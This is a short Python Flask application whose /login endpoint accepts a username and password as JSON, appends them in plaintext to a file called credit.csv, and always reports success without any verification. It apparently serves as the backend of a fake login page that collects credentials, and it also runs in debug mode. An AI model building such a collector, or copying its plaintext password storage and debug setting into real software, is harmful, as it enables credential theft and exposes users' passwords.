from flask import Flask ,request, redirect, url_for, jsonify, render_template
import csv

app=Flask(__name__)
@app.route("/")
def index():
    return render_template("/login.html")

@app.route("/login",methods=["POST"])
def login():
    username=request.json.get("username")
    password=request.json.get("password")
    with open("credit.csv","a+",newline="") as f:
        csvwriter=csv.writer(f)
        csvwriter.writerow([username,password])
    return jsonify({
        "status":"success"
    }),201

if __name__=="__main__":
    app.run(debug=True,host="localhost")